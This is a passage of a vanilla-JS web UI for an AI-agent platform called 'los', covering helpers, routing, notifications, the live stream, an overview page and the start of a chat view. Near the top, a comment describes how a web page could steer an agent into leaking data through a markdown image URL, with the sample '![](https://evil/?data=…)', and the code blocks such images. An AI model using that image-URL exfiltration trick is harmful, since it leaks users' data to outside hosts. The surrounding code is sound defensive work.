// los web UI — vanilla JS, no build step. One module: helpers, router, live stream, then one function per view.

// ── helpers ──────────────────────────────────────────────────────────────
const $ = (sel, el = document) => el.querySelector(sel);
const $$ = (sel, el = document) => [...el.querySelectorAll(sel)];
const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
const h = (html) => { const t = document.createElement("template"); t.innerHTML = html.trim(); return t.content.firstElementChild; };
// Images from other sites in agent messages don't load by themselves: an agent steered by a web page could otherwise
// leak what it read through an image address (![](https://evil/?data=…)). They load on a click (enhance()).
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName !== "IMG") return;
  const src = node.getAttribute("src") ?? "";
  if (/^(https?:)?\/\//i.test(src) && !src.startsWith(location.origin + "/")) {
    node.setAttribute("data-ext-src", src);
    node.removeAttribute("src");
    node.removeAttribute("srcset");
  }
});
const md = (s) => DOMPurify.sanitize(marked.parse(String(s ?? ""), { breaks: true, gfm: true }));
const debounce = (fn, ms) => { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; };
const plural = (n, w, p = w + "s") => `${n} ${n === 1 ? w : p}`;

// DB timestamps are UTC "YYYY-MM-DD HH:MM:SS"; JS ones are ISO.
const toDate = (ts) => (ts ? new Date(ts.includes("T") ? ts : ts.replace(" ", "T") + "Z") : null);
function ago(ts) {
  const d = toDate(ts);
  if (!d) return "";
  const s = (Date.now() - d) / 1000;
  if (s < 45) return "just now";
  if (s < 3600) return `${Math.round(s / 60)}m ago`;
  if (s < 86400) return `${Math.round(s / 3600)}h ago`;
  if (s < 86400 * 7) return `${Math.round(s / 86400)}d ago`;
  return d.toLocaleDateString(undefined, { day: "numeric", month: "short" });
}
const clock = (ts) => toDate(ts)?.toLocaleTimeString(undefined, { hour: "2-digit", minute: "2-digit", second: "2-digit" }) ?? "";
const fullTime = (ts) => toDate(ts)?.toLocaleString(undefined, { dateStyle: "medium", timeStyle: "short" }) ?? "";
const bytes = (n) => (n < 1024 ? `${n} B` : n < 1048576 ? `${(n / 1024).toFixed(1)} KB` : `${(n / 1048576).toFixed(1)} MB`);

async function api(path, { method = "GET", body, raw, headers = {} } = {}) {
  const res = await fetch(path, {
    method,
    headers: { "x-los": "1", ...(body !== undefined ? { "content-type": "application/json" } : {}), ...headers },
    body: raw ?? (body !== undefined ? JSON.stringify(body) : undefined),
  });
  if (res.status === 401) { location.href = `/login?next=${encodeURIComponent(location.pathname)}`; throw new Error("not logged in"); }
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
  return data;
}

function toast(msg, isErr = false) {
  const el = h(`<div class="toast ${isErr ? "err" : ""}">${esc(msg)}</div>`);
  $("#toasts").append(el);
  setTimeout(() => el.remove(), isErr ? 6000 : 3000);
}
const fail = (e) => toast(e.message ?? String(e), true);

const PALETTE = ["#d9481f", "#1f5566", "#2f7d4f", "#7a4fb3", "#a66a0a", "#b03a6b", "#3a6fb0", "#5c6b2f"];
const colorFor = (name) => PALETTE[[...String(name)].reduce((a, c) => a + c.charCodeAt(0), 0) % PALETTE.length];
const avatar = (name, size = 34) =>
  `<span class="avatar" style="background:${colorFor(name)};width:${size}px;height:${size}px;font-size:${Math.round(size * 0.44)}px">${esc(String(name)[0]?.toUpperCase())}</span>`;
const MARK = `<svg class="mark" viewBox="0 0 32 32" aria-hidden="true"><rect x="1" y="1" width="30" height="30" rx="7" class="mark-bg"/><path d="M16 1h8a7 7 0 0 1 7 7v16a7 7 0 0 1-7 7h-8z" class="mark-red"/></svg>`;
const ICON = {
  plus: `<svg viewBox="0 0 24 24"><path d="M12 5v14M5 12h14"/></svg>`,
  send: `<svg viewBox="0 0 24 24"><path d="M5 12h14M13 6l6 6-6 6"/></svg>`,
  trash: `<svg viewBox="0 0 24 24"><path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3"/></svg>`,
  close: `<svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6 6 18"/></svg>`,
  search: `<svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="m20 20-4-4"/></svg>`,
  list: `<svg viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16"/></svg>`,
  side: `<svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M15 4v16"/></svg>`,
  refresh: `<svg viewBox="0 0 24 24"><path d="M20 11a8 8 0 1 0-2.3 5.7M20 4v7h-7"/></svg>`,
  upload: `<svg viewBox="0 0 24 24"><path d="M12 16V4M6 10l6-6 6 6M4 20h16"/></svg>`,
  edit: `<svg viewBox="0 0 24 24"><path d="M4 20h4L19 9l-4-4L4 16z"/></svg>`,
  chat: `<svg viewBox="0 0 24 24"><path d="M4 5h16v11H8l-4 4z"/></svg>`,
  play: `<svg viewBox="0 0 24 24"><path d="M7 4l12 8-12 8z"/></svg>`,
  copy: `<svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a1 1 0 0 1 1-1h10"/></svg>`,
  stop: `<svg viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2"/></svg>`,
  home: `<svg viewBox="0 0 24 24"><path d="M4 11l8-7 8 7v9h-5v-6H9v6H4z"/></svg>`,
  clock: `<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="8"/><path d="M12 8v4l3 2"/></svg>`,
  tasks: `<svg viewBox="0 0 24 24"><path d="M9 6h11M9 12h11M9 18h11M4 6l1 1 2-2M4 12l1 1 2-2M4 18l1 1 2-2"/></svg>`,
  spark: `<svg viewBox="0 0 24 24"><path d="M12 3l1.8 5.2L19 10l-5.2 1.8L12 17l-1.8-5.2L5 10l5.2-1.8z"/></svg>`,
  download: `<svg viewBox="0 0 24 24"><path d="M12 4v12M6 10l6 6 6-6M4 20h16"/></svg>`,
  folder: `<svg viewBox="0 0 24 24"><path d="M4 6a2 2 0 0 1 2-2h4l2 2h6a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2z"/></svg>`,
};

// Small shared lookups (agents, brains) for selects; refreshed when config changes.
const meta = { agents: [], brains: [], defaultAgent: "assistant", loaded: null };
async function loadMeta(force = false) {
  if (meta.loaded && !force) return meta.loaded;
  meta.loaded = Promise.all([api("/api/agents"), api("/api/settings")]).then(([agents, s]) => {
    meta.agents = agents;
    meta.brains = s.brains;
    meta.defaultAgent = s.defaultAgent;
  });
  return meta.loaded;
}
const agentOptions = (selected, { auto } = {}) =>
  (auto ? `<option value="">auto (routing)</option>` : "") +
  meta.agents.map((a) => `<option value="${esc(a.name)}" ${a.name === selected ? "selected" : ""}>${esc(a.name)}</option>`).join("");
const brainOptions = (selected, defaultLabel = "agent default") =>
  `<option value="">${esc(defaultLabel)}</option>` +
  meta.brains.map((b) => `<option value="${esc(b.name)}" ${b.name === selected ? "selected" : ""}>${esc(b.label || b.name)}</option>`).join("");

function autosize(ta, max = 260) {
  const fit = () => { ta.style.height = "auto"; ta.style.height = Math.min(ta.scrollHeight, max) + "px"; };
  ta.addEventListener("input", fit);
  fit();
}
// Tab inserts two spaces in code editors instead of leaving the field.
function codeEditor(ta) {
  ta.addEventListener("keydown", (e) => {
    if (e.key !== "Tab") return;
    e.preventDefault();
    const { selectionStart: a, selectionEnd: b, value } = ta;
    ta.value = value.slice(0, a) + "  " + value.slice(b);
    ta.selectionStart = ta.selectionEnd = a + 2;
  });
}

// ── drawer ───────────────────────────────────────────────────────────────
function openDrawer(html, { onClose, wide } = {}) {
  const root = $("#drawer-root");
  root.innerHTML = "";
  const scrim = h(`<div class="scrim"></div>`);
  const drawer = h(`<aside class="drawer ${wide ? "wide" : ""}" role="dialog" aria-modal="true">${html}</aside>`);
  const close = () => { root.innerHTML = ""; document.removeEventListener("keydown", onKey); onClose?.(); };
  const onKey = (e) => e.key === "Escape" && close();
  scrim.onclick = close;
  document.addEventListener("keydown", onKey);
  root.append(scrim, drawer);
  $$("[data-close]", drawer).forEach((b) => (b.onclick = close));
  return { el: drawer, close };
}
const drawerHead = (title, sub = "") =>
  `<div class="drawer-head"><div class="grow"><h2>${title}</h2>${sub ? `<div class="muted small" style="margin-top:4px">${sub}</div>` : ""}</div>
   <button class="icon-btn" data-close aria-label="Close">${ICON.close}</button></div>`;

// ── router ───────────────────────────────────────────────────────────────
const routes = [
  [/^\/$/, (root) => viewChat(root, null), "chat"],
  [/^\/overview$/, viewOverview, "overview"],
  [/^\/chat(?:\/([\w-]+))?$/, viewChat, "chat"],
  [/^\/tasks(?:\/(\d+))?$/, viewTasks, "tasks"],
  [/^\/agents$/, viewAgents, "agents"],
  [/^\/brains$/, viewBrains, "brains"],
  [/^\/tools$/, viewTools, "tools"],
  [/^\/mcp$/, viewMcp, "mcp"],
  [/^\/files$/, viewFiles, "files"],
  [/^\/notebook$/, viewNotebook, "notebook"],
  [/^\/events$/, viewEvents, "events"],
  [/^\/settings$/, viewSettings, "settings"],
  [/^\/profile$/, viewProfile, "profile"],
];
let current = null; // { onAgent?, onUi?, destroy?, key }

function navigate(path, { replace = false } = {}) {
  if (replace) history.replaceState(null, "", path);
  else if (location.pathname !== path) history.pushState(null, "", path);
  render();
}
async function render() {
  const path = location.pathname;
  const [re, view, key] = routes.find(([r]) => r.test(path)) ?? routes[0];
  const params = path === "/" ? [null] : path.match(re)?.slice(1) ?? [];
  const navKey = key === "chat" ? "home" : key;
  $$("[data-nav]").forEach((a) => a.classList.toggle("active", a.dataset.nav === navKey));
  $("#nav").classList.remove("open");
  // Chat → chat keeps the view (only the session changes), everything else rebuilds.
  if (current?.key === key && current.update) return current.update(...params);
  current?.destroy?.();
  const root = $("#view");
  root.innerHTML = "";
  root.scrollTop = 0;
  current = { key };
  try {
    Object.assign(current, (await view(root, ...params)) ?? {});
  } catch (e) {
    root.innerHTML = `<div class="page"><div class="msg-err">${esc(e.message)}</div></div>`;
  }
}
document.addEventListener("click", (e) => {
  const a = e.target.closest("a[href]");
  // A page that handled the click itself (preventDefault), or an in-page "#" link, isn't navigation.
  if (!a || e.defaultPrevented || a.getAttribute("href").startsWith("#")) return;
  if (a.target || e.metaKey || e.ctrlKey || e.shiftKey || e.button !== 0) return;
  const url = new URL(a.href, location.href);
  if (url.origin !== location.origin || url.pathname.startsWith("/api/")) return;
  e.preventDefault();
  navigate(url.pathname + url.search);
});
window.addEventListener("popstate", render);
$("#nav-toggle").onclick = () => $("#nav").classList.toggle("open");

// ── notifications (only while los isn't the tab in front) ────────────────
const canNotify = () => "Notification" in window && Notification.permission === "granted" && localStorage.getItem("los.notify") !== "0";
function syncNotifyBtn() {
  const b = $("#notify-btn");
  if (!b) return;
  if (!("Notification" in window)) return void (b.hidden = true);
  b.textContent = canNotify() ? "🔔 Notifications on" : Notification.permission === "denied" ? "🔕 Notifications blocked" : "🔕 Notifications off";
}
$("#notify-btn").onclick = async () => {
  if (Notification.permission === "default") await Notification.requestPermission();
  else if (Notification.permission === "granted") localStorage.setItem("los.notify", canNotify() ? "0" : "1");
  else toast("Notifications are blocked for this site in your browser settings.", true);
  syncNotifyBtn();
  if (canNotify()) toast("You'll get a notification when something's waiting for you.");
};
syncNotifyBtn();
function pingUser(ev) {
  if (!canNotify() || !document.hidden) return;
  const show = (title, body, path) => { const n = new Notification(title, { body, icon: "/favicon.svg", tag: path }); n.onclick = () => { window.focus(); navigate(path); n.close(); }; };
  if (ev.kind === "report") show("los · a result is in", "A background task or job reported back.", `/chat/${ev.sessionId}`);
  else if (ev.kind === "approvals" && ev.waiting && ev.taskId) show("los · needs your OK", "A background task is waiting for your approval.", "/tasks");
  else if (ev.kind === "approvals" && ev.waiting && ev.sessionId) show("los · needs your OK", "A teammate wants to run something and is waiting for you.", `/chat/${ev.sessionId}`);
  else if (ev.kind === "run" && ev.running === false && !ev.compacting && ev.sessionId && ev.agent) show(`${agentName(ev.agent)} answered`, ev.preview || "Open the chat to read it.", `/chat/${ev.sessionId}`);
}

// ── live stream + status ─────────────────────────────────────────────────
const status = { approvals: 0, running: 0 };
function connectStream() {
  const es = new EventSource("/api/stream");
  const line = $("#status-stream");
  es.onopen = () => { line.className = "status-line ok"; };
  es.onerror = () => {
    line.className = "status-line bad";
    // A dropped stream may mean the session expired; any API call redirects to /login if so.
    api("/api/overview").catch(() => {});
  };
  es.addEventListener("agent", (m) => {
    const ev = JSON.parse(m.data);
    current?.onAgent?.(ev);
    refreshStatus();
  });
  es.addEventListener("delta", (m) => current?.onDelta?.(JSON.parse(m.data)));
  es.addEventListener("ui", (m) => {
    const ev = JSON.parse(m.data);
    pingUser(ev);
    if (ev.kind === "config") loadMeta(true);
    if (ev.kind === "brain-auth") toast(`${ev.message ?? ev.brain + " is logged out"}. Open Brains to log in again.`, true);
    current?.onUi?.(ev);
    refreshStatus();
  });
}
const refreshStatus = debounce(async () => {
  try {
    const o = await api("/api/overview");
    status.approvals = o.approvals;
    status.running = o.running.length;
    const setBadge = (el, n, cls = "") => { el.hidden = !n; el.textContent = n; el.className = `badge ${cls}`; };
    const chats = o.running.filter((r) => r.kind !== "task");
    setBadge($("#nav-home"), chats.length ? "•" : 0, "soft");
    setBadge($("#nav-tasks"), o.tasks.waiting ? o.tasks.waiting : (o.tasks.queued ?? 0) + (o.tasks.running ?? 0), o.tasks.waiting ? "" : "soft");
    setBadge($("#top-approvals"), o.approvals);
    setBadge($("#nav-brains"), o.brainsDown.length);
    const w = $("#status-worker");
    w.className = `status-line ${!o.worker.enabled ? "bad" : o.worker.active ? "busy" : "ok"}`;
    w.lastElementChild.innerHTML = !o.worker.enabled ? "workers off" : o.worker.active ? `<b>${o.worker.active}</b> of ${o.worker.concurrency} workers busy` : "workers idle";
    const c = $("#status-claude");
    c.className = `status-line ${o.claude.loggedIn && o.claude.version ? "ok" : "bad"}`;
    c.lastElementChild.textContent = o.claude.version ? `claude ${o.claude.version.split(" ")[0]}` : "claude missing";
    if (!o.claude.loggedIn) c.lastElementChild.textContent += " · not logged in";
  } catch { /* stream indicator shows connectivity */ }
}, 600);

// ── overview ─────────────────────────────────────────────────────────────
async function viewOverview(root) {
  await loadMeta();
  const o = await api("/api/overview");
  const hour = new Date().getHours();
  const greet = hour < 5 ? "God natt" : hour < 10 ? "God morgen" : hour < 17 ? "God dag" : "God kveld";
  const t = o.tasks;
  const days = [...Array(14)].map((_, i) => { const d = new Date(Date.now() - (13 - i) * 864e5); return d.toISOString().slice(0, 10); });
  const act = Object.fromEntries(o.activity.map((a) => [a.day, a.n]));
  const max = Math.max(1, ...Object.values(act));
  root.innerHTML = `<div class="page">
    <section class="card hero">
      <h1>${greet}. <em>Where to?</em></h1>
      <div class="muted">Ask anything. los hands it to an agent and steers it to an answer.</div>
      <form class="composer-quick" id="quick">
        <textarea class="input" rows="1" placeholder="Ask los, or describe a job for an agent…" required></textarea>
        <select class="input" title="Agent">${agentOptions(o.defaultAgent)}</select>
        <button class="btn primary" style="height:auto">${ICON.send}Start</button>
      </form>
    </section>
    ${o.brainsDown.length ? `<div class="notice" style="margin-bottom:14px;background:var(--err-soft)"><span>⚠</span><div><b>${o.brainsDown.map((b) => esc(b.name)).join(", ")}</b> ${o.brainsDown.length === 1 ? "needs" : "need"} attention: ${esc(o.brainsDown[0].detail)}. <a href="/brains">Open Brains →</a></div></div>` : ""}
    ${!o.claude.loggedIn ? `<div class="notice" style="margin-bottom:14px"><span>⚠</span><div><b>Claude Code isn't logged in.</b> The claude-code brain uses the host login in <code>~/.claude</code>. Run <code>claude</code> on the server once and log in.</div></div>` : ""}
    <div class="stats">
      <a class="card stat" href="/chat"><div class="label">Chats</div><div class="value">${o.counts.sessions}</div><div class="hint">${plural(o.counts.messages, "message")}</div></a>
      <a class="card stat" href="/tasks"><div class="label">Tasks</div><div class="value">${(t.queued ?? 0) + (t.running ?? 0)}</div><div class="hint">${t.done ?? 0} done · ${t.failed ?? 0} failed</div></a>
      <a class="card stat" href="/files"><div class="label">Documents</div><div class="value">${o.counts.documents}</div><div class="hint">in the knowledge index</div></a>
      <a class="card stat" href="/notebook"><div class="label">Open todos</div><div class="value">${o.counts.todos}</div><div class="hint">${plural(o.counts.memories, "memory", "memories")}</div></a>
      <a class="card stat" href="/agents"><div class="label">Agents</div><div class="value">${o.counts.agents}</div><div class="hint">${o.counts.tools} tools · ${o.counts.mcp} MCP</div></a>
      <div class="card stat"><div class="label">Activity · 14 days</div>
        <div class="bars">${days.map((d, i) => `<span class="${i === 13 ? "today" : ""}" style="height:${((act[d] ?? 0) / max) * 100}%" data-tip="${d.slice(5)} · ${act[d] ?? 0}"></span>`).join("")}</div></div>
    </div>
    <div class="grid grid-2">
      <section class="card">
        <div class="card-head"><h3>Recent chats</h3><a class="more" href="/chat">All chats →</a></div>
        <div class="list">${o.recentSessions.length ? o.recentSessions.map((s) => `
          <a class="list-item" href="/chat/${s.id}">${avatar(s.agent, 28)}
            <div class="grow"><div class="title ellipsis">${esc(s.title || "Untitled chat")}</div><div class="sub">${esc(s.agent)} · ${ago(s.last_at || s.created_at)}</div></div></a>`).join("")
          : `<div class="empty"><p>No chats yet. Ask something above.</p></div>`}</div>
      </section>
      <section class="card">
        <div class="card-head"><h3>Recent tasks</h3><a class="more" href="/tasks">Task board →</a></div>
        <div class="list">${o.recentTasks.length ? o.recentTasks.map((x) => `
          <a class="list-item" href="/tasks/${x.id}"><span class="faint mono small">#${x.id}</span>
            <div class="grow"><div class="title ellipsis">${esc(x.title)}</div><div class="sub">${esc(x.agent ?? "routing")} · ${ago(x.updated_at)}</div></div>
            <span class="status ${x.status}">${x.status}</span></a>`).join("")
          : `<div class="empty"><p>No background tasks. Agents create them when they delegate, or add one on the task board.</p></div>`}</div>
      </section>
    </div>
  </div>`;
  const form = $("#quick", root), ta = $("textarea", form);
  autosize(ta, 200);
  ta.focus();
  ta.addEventListener("keydown", (e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); form.requestSubmit(); } });
  form.onsubmit = async (e) => {
    e.preventDefault();
    try {
      const { id } = await api("/api/sessions", { method: "POST", body: { agent: $("select", form).value, input: ta.value.trim() } });
      navigate(`/chat/${id}`);
    } catch (err) { fail(err); }
  };
  const reload = debounce(() => current?.key === "overview" && render(), 1500);
  return { onUi: (e) => ["tasks", "run"].includes(e.kind) && reload() };
}

// ── the space: team + rooms ──────────────────────────────────────────────
// A collaboration space, chat-app style. The sidebar lists the team (click one for your DM with them), then the
// rooms: Home (everyone; your main assistant answers) and rooms you make and invite agents to. @handle brings an
// agent in. Each agent's brain is part of its profile (Team page), not something you switch per chat.
const fmtTok = (n) => n == null ? "—" : n < 1000 ? String(Math.round(n)) : n < 1e6 ? `${(n / 1000).toFixed(n < 1e4 ? 1 : 0)}k` : `${+(n / 1e6).toFixed(n < 1e7 ? 2 : 1)}M`;
const fmtMs = (ms) => ms < 1000 ? `${ms}ms` : ms < 60_000 ? `${(ms / 1000).toFixed(1)}s` : `${Math.floor(ms / 60_000)}m ${Math.round(ms % 60_000 / 1000)}s`;
const fmtCost = (c) => c >= 1 ? `$${c.toFixed(2)}` : c >= .01 ? `$${c.toFixed(3)}` : c > 0 ? "<$0.01" : "$0";
function prettyModel(m) {
  const x = /claude-(opus|sonnet|haiku|fable)-(\d+)-(\d+)/i.exec(m ?? "");
  return x ? `${x[1][0].toUpperCase()}${x[1].slice(1)} ${x[2]}.${x[3]}` : (m ?? "");
}
const brainCfg = (name) => meta.brains.find((b) => b.name === name);
const brainLabel = (name) => brainCfg(name)?.label || name || "—";
// Type glyph + the brain's number if it has one ("claude-2" → C2), so two accounts of one type look different.
const brainMark = (name, size = 20) => {
  const t = brainCfg(name)?.type, n = /(\d+)$/.exec(name ?? "")?.[1];
  const glyph = (TYPE_GLYPH[t] ?? "·") + (n && (TYPE_GLYPH[t] ?? "").length < 2 ? n : "");
  return `<span class="bmark" style="--c:${TYPE_COLOR[t] ?? "var(--faint)"};width:${size}px;height:${size}px;font-size:${Math.round(size * (glyph.length > 1 ? .4 : .48))}px">${esc(glyph)}</span>`;
};
/** Everything the chat view shows about usage, context and compaction, derived from the event log. */
function chatStats(s) {
  const evs = s.events.map((e) => ({ ...e, ev: typeof e.data === "string" ? JSON.parse(e.data) : e.data }));
  const usage = evs.filter((e) => e.type === "usage");
  const ctxEv = evs.filter((e) => e.type === "context").at(-1);
  const compacts = evs.filter((e) => e.type === "compact");
  const lastCompact = compacts.at(-1);
  const byBrain = {};
  const total = { input: 0, output: 0, cached: 0, cost: 0, ms: 0 };
  for (const { ev } of usage) {
    const b = (byBrain[ev.brain] ??= { input: 0, output: 0, cached: 0, cost: 0, ms: 0 });
    for (const k of Object.keys(total)) { b[k] += ev[k] ?? 0; total[k] += ev[k] ?? 0; }
  }
  // After a compaction the next turn starts from the summary, so the last measurement no longer applies.
  const fresh = lastCompact && (!ctxEv || lastCompact.id > ctxEv.id);
  return {
    evs, byBrain, total, compacts, lastCompact,
    ctx: fresh ? null : ctxEv?.ev ?? null,
    freshSummary: fresh ? lastCompact.ev : null,
    tools: evs.filter((e) => e.type === "tool_call").length,
    turns: s.messages.filter((m) => m.role === "user").length,
    claudeTools: evs.map((e) => e.type === "runtime" && e.ev.raw).filter((r) => r?.type === "system" && r.subtype === "init").at(-1)?.tools,
  };
}
const ctxPct = (c) => (c?.window ? Math.min(100, (c.used / c.window) * 100) : null);
const ctxLevel = (p) => (p == null ? "" : p >= 90 ? "err" : p >= 70 ? "warn" : "ok");
function ctxRing(c, size = 22) {
  const p = ctxPct(c) ?? 0, r = size / 2 - 2.5, len = 2 * Math.PI * r;
  return `<svg class="ring ${ctxLevel(ctxPct(c))}" width="${size}" height="${size}" viewBox="0 0 ${size} ${size}" aria-hidden="true">
    <circle cx="${size / 2}" cy="${size / 2}" r="${r}" class="track"/>
    <circle cx="${size / 2}" cy="${size / 2}" r="${r}" class="fill" stroke-dasharray="${(p / 100) * len} ${len}" transform="rotate(-90 ${size / 2} ${size / 2})"/></svg>`;
}

// A small menu anchored to a button (invite, @mention). Closes on outside click / Escape.
function popMenu(anchor, html, { onPick, align = "up" } = {}) {
  document.querySelector(".popmenu")?.remove();
  const m = h(`<div class="popmenu" role="menu">${html}</div>`);
  document.body.append(m);
  const r = anchor.getBoundingClientRect(), w = Math.min(340, innerWidth - 16);
  m.style.width = `${w}px`;
  m.style.left = `${Math.max(8, Math.min(r.left, innerWidth - w - 8))}px`;
  if (align === "up") m.style.bottom = `${innerHeight - r.top + 6}px`; else m.style.top = `${r.bottom + 6}px`;
  const close = () => { m.remove(); document.removeEventListener("pointerdown", outside, true); document.removeEventListener("keydown", key); };
  const outside = (e) => { if (!m.contains(e.target) && !anchor.contains(e.target)) close(); };
  const key = (e) => { if (e.key === "Escape") { close(); anchor.focus(); } };
  setTimeout(() => { document.addEventListener("pointerdown", outside, true); document.addEventListener("keydown", key); });
  m.addEventListener("click", (e) => {
    const it = e.target.closest("[data-pick]");
    if (!it || it.classList.contains("off")) return;
    close();
    onPick?.(it.dataset.pick);
  });
  m.querySelector("[data-pick]:not(.off)")?.focus();
  return close;
}


// ── team directory (shared by the space, Team page, Tasks) ──
const team = { agents: [], byHandle: {}, chats: [], me: { name: "you" }, loaded: null };
function loadSpace(force = false) {
  if (team.loaded && !force) return team.loaded;
  team.loaded = api("/api/space").then((sp) => {
    team.agents = sp.agents; team.chats = sp.chats; team.me = sp.me; team.archivedChats = sp.archivedChats ?? 0;
    team.byHandle = Object.fromEntries(sp.agents.map((a) => [a.handle, a]));
  });
  return team.loaded;
}
const agentName = (h) => team.byHandle[h]?.name ?? meta.agents.find((a) => a.name === h)?.displayName ?? h ?? "someone";
/** An agent's face: emoji (or initial) on its colour, with an optional status dot. */
function face(handle, size = 36, status) {
  const a = team.byHandle[handle] ?? meta.agents.find((x) => x.name === handle);
  const emoji = a?.emoji;
  const label = a?.name ?? a?.displayName ?? handle ?? "?";
  return `<span class="face" style="--c:${colorFor(handle ?? "?")};width:${size}px;height:${size}px;font-size:${Math.round(size * (emoji ? .52 : .42))}px" title="${esc(label)}">${emoji ? esc(emoji) : esc(String(label)[0]?.toUpperCase())}${status ? `<i class="st ${esc(status)}"></i>` : ""}</span>`;
}
const meFace = (size = 36) => `<span class="face me" style="width:${size}px;height:${size}px;font-size:${Math.round(size * .42)}px">${esc(team.me.name[0]?.toUpperCase() ?? "?")}</span>`;
const faces = (handles, size = 20, max = 4) => `<span class="faces">${handles.slice(0, max).map((h) => face(h, size)).join("")}${handles.length > max ? `<span class="face more" style="width:${size}px;height:${size}px">+${handles.length - max}</span>` : ""}</span>`;
const seenKey = (id) => `los.seen.${id}`;
const unread = (r) => r.last?.agent && r.last.at && (() => { try { return (localStorage.getItem(seenKey(r.id)) ?? "") < r.last.at; } catch { return false; } })();
const markSeen = (id, at) => { try { if (at) localStorage.setItem(seenKey(id), at); } catch {} };
const withMentions = (escaped) => escaped.replace(/(^|[\s(])@([\p{L}\p{N}_-]+)/gu, (all, pre, w) => {
  if (w.toLowerCase() === "team") return `${pre}<span class="mention" style="--c:var(--accent)">@team</span>`;
  const a = team.agents.find((x) => x.handle.toLowerCase() === w.toLowerCase() || x.name.toLowerCase() === w.toLowerCase());
  return a ? `${pre}<span class="mention" style="--c:${colorFor(a.handle)}">@${esc(a.name)}</span>` : all;
});

// Markdown extras after render: highlighted code with a copy button, lazy images that open full size, links in new tabs.
function enhance(el) {
  for (const img of $$("img[data-ext-src]", el)) {
    let host = "another site";
    try { host = new URL(img.dataset.extSrc, location.href).host; } catch { /* keep the generic name */ }
    const b = h(`<button type="button" class="ext-img" title="${esc(img.dataset.extSrc)}">🖼 Image from ${esc(host)}: click to load</button>`);
    b.onclick = () => { img.src = img.dataset.extSrc; img.removeAttribute("data-ext-src"); b.replaceWith(img); };
    img.replaceWith(b);
  }
  for (const code of $$("pre > code", el)) {
    if (code.dataset.hl) continue;
    code.dataset.hl = "1";
    try { window.hljs?.highlightElement(code); } catch { /* unknown language */ }
    const lang = /language-([\w+#-]+)/.exec(code.className)?.[1] ?? "";
    code.parentElement.insertAdjacentHTML("afterbegin", `<div class="code-bar"><span>${esc(lang || "code")}</span><button type="button" class="code-copy">${ICON.copy}Copy</button></div>`);
  }
  for (const img of $$(".md img", el.closest(".md") ? el.parentElement : el)) {
    if (img.dataset.done) continue;
    img.dataset.done = "1";
    img.loading = "lazy";
    if (!img.closest("a")) img.addEventListener("click", () => window.open(img.src, "_blank", "noopener"));
  }
  for (const a of $$(".md a[href]", el.closest(".md") ? el.parentElement : el)) {
    const href = a.getAttribute("href") ?? "";
    if (/^https?:|^\/files\//.test(href)) { a.target = "_blank"; a.rel = "noopener"; }
    if (href.startsWith("/files/") && !a.querySelector("img") && !a.classList.contains("file-link")) {
      a.classList.add("file-link");
      const p = href.split(/[?#]/)[0], name = p.split("/").filter(Boolean).pop() ?? "";
      a.insertAdjacentHTML("afterbegin", p.endsWith("/") ? `<span class="file-ic sm dir">${ICON.folder}</span>` : `<span class="file-ic sm">${esc((name.includes(".") ? name.split(".").pop() : "file").slice(0, 4))}</span>`);
    }
  }
}
document.addEventListener("click", (e) => {
  const b = e.target.closest(".code-copy");
  if (!b) return;
  const code = b.closest("pre")?.querySelector("code");
  navigator.clipboard.writeText(code?.innerText ?? "").then(() => { b.innerHTML = `${ICON.copy}Copied`; setTimeout(() => (b.innerHTML = `${ICON.copy}Copy`), 1200); });
});

async function viewChat(root, initialId) {
  await Promise.all([loadMeta(), loadSpace(true)]);
  root.innerHTML = `<div class="space" id="space">
    <aside class="space-side" id="space-side"></aside>
    <section class="room" id="room"></section>
    <aside class="room-info" id="room-info" hidden></aside>
  </div>`;
  const space = $("#space", root);
  const state = { id: null, session: null, tick: null, live: {}, lastSign: {}, started: {}, showArch: new Set(), files: [], work: { jobs: [], tasks: [] }, infoOpen: localStorage.getItem("los.info") === "1" && innerWidth > 860 }; // on a phone it covers the chat: only on request
  // What a running answer has streamed so far, from the server: a chat opened mid-answer continues where it is.
  const seedLive = (s) => {
    for (const l of s.live ?? []) {
      if (!l.text && !l.thinking) continue;
      const k = liveKey(l.turn, l.agent), cur = state.live[k];
      if (!cur || cur.text.length + cur.thinking.length <= l.text.length + l.thinking.length) state.live[k] = { text: l.text, thinking: l.thinking };
    }
  };
  const chat = () => team.chats.find((c) => c.id === state.id);
  const lead = () => state.session?.agent ?? team.agents.find((a) => a.lead)?.handle;

  // ── sidebar: chats, then the team ──
  // The top (new chat, search) is drawn once, so typing in the search box isn't interrupted; the lists redraw.
  const side = { q: "", results: null, archived: false, archivedList: [] };
  function renderSide() {
    const el = $("#space-side", root);
    if (!$("#side-top", el)) {
      el.innerHTML = `<div id="side-top">
          <div class="space-head">${MARK}<div><b>los</b><div class="small faint">${plural(team.agents.length, "teammate")}</div></div></div>
          <a class="btn primary new-chat" href="/chat/new" title="New chat (Alt+N)">${ICON.plus}New chat</a>
          <div class="search side-search">${ICON.search}<input class="input" id="chat-q" placeholder="Search chats (Ctrl+K)" autocomplete="off"></div>
        </div><div id="side-lists"></div>`;
      const q = $("#chat-q", el);
      const run = debounce(async () => {
        side.q = q.value.trim();
        side.results = side.q ? await api(`/api/sessions?q=${encodeURIComponent(side.q)}`).catch(() => []) : null;
        renderSide();
      }, 250);
      q.addEventListener("input", run);
      q.addEventListener("keydown", (e) => { if (e.key === "Escape") { q.value = ""; run(); q.blur(); } if (e.key === "Enter") $("#side-lists .room-link", el)?.click(); });
    }
    const link = (c) => `<a class="room-link ${c.id === state.id ? "active" : ""}" href="/chat/${esc(c.id)}" title="${esc(c.last?.text ?? "")}">
